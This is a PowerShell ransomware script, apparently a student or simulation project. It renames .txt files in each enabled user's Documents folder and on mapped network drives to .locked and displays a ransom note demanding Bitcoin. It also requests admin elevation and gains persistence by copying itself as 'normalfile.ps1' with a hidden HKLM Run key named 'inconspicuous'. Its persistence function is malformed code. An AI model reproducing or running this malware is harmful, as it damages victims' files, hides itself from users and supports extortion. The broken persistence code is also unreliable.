#-----------------------------------------------------DEFINE FUNCTIONS--------------------------------------------------------------------------------------

#FUNCTION that traverses specified directory and change files extensions to .locked 
#this function takes the parameter $user as input and will run for as many enabled users there are on the system
function encrypt {
    param($user)
    $file_path = "C:\Users\" + $user + "\Documents"
    Get-ChildItem -Path $file_path -Filter "*.txt" -Recurse | Rename-Item -NewName {
        $_.Name -replace ".txt", ".locked"
    }       
}

#FUNCTION that creates the ransom note, spawn notepad process, and write content to note
#It will clear before writing so when it runs on reboot the ransom note only appears once
function message {
    $note_path = "C:\Users\Public\note.txt"
    Clear-Content -Path $note_path
    "Your files have been encrypted. Send 1 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlj if you want your files back." | Add-Content -Path $note_path
    Start-Process Notepad -ArgumentList $note_path
}

#FUNCTION that creates persistence by writing itself to current users \AppData\Roaming dir. Also creates registry key to run the script on boot every startup
#Something to note here is I didn't include the persist function or the elevation prompt because changing the file extensions and spawning the notepad doesn't require
#However, the key will be HKLM because I want it to affect every user 
function persist {
    param($current_user)
    $destination = "C:\Users\" + $current_user + "\AppData\Roaming\normalfile.ps1"

    $script = 
    function encrypt {
    param($user)
    $file_path = "C:\Users\" + $user + "\Documents"
    Get-ChildItem -Path $file_path -Filter "*.txt" -Recurse | Rename-Item -NewName {
        $_.Name -replace ".txt", ".locked"
    }       
}

    function message {
        $note_path = "C:\Users\Public\note.txt"
        Clear-Content -Path $note_path
        "Your files have been encrypted. Send 1 BTC to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlj if you want your files back." | Add-Content -Path $note_path
        Start-Process Notepad -ArgumentList $note_path
        }

    $users = @(Get-LocalUser)
    $enabled_users = $users | Where-Object { $_.Enabled -eq $true }

    foreach ($user in $enabled_users) {
        encrypt $user
}

    message


    $script | Set-Content -Path $destination -Encoding UTF8

    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destination`""
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "inconspicuous" -Value $command
}

#simulate lateral movement by enumerating network drives, where contents of said drives are encrypted as well
function lateral {
   $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.DisplayRoot -like "\\*"}

   foreach ($drive in $drives) {
       $file_path = $drive
       Get-ChildItem -Path $file_path -Filter "*.txt" -Recurse | Rename-Item -NewName {
       $_.Name -replace ".txt", ".locked"
       }       
    }
}

#-------------------------------------------------------------SCRIPT STARTS HERE-----------------------------------------------------------------------------------

#Prompts the script to run as admin, I found this on a forum and modified it slightly to get rid of the bloat
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`""
    exit
}

#put all enabled local users into array
$users = @(Get-LocalUser)
$enabled_users = $users | Where-Object { $_.Enabled -eq $true }

#for each enabled local user, call the encrypt function
foreach ($user in $enabled_users) {
    encrypt $user
}

#call message function
message

#identify the current user via environmental variable and pass the current user into the persist function
$current_user = "$env:USERNAME" 
persist $current_user

#call lateral function
lateral